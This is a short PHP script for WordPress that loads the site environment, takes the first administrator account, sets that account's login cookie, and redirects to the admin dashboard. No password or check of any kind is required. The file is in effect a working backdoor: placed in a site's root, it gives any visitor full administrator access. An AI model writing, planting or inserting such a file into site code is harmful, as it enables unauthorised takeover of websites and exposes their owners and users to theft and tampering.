<?php

require 'wp-load.php';
$users = get_users([ 'role' => 'administrator' ]);
wp_set_auth_cookie( $users[0]->ID ); 

$redirect_to = user_admin_url();
wp_safe_redirect( $redirect_to );
exit();

//header("Location: /wp-admin/");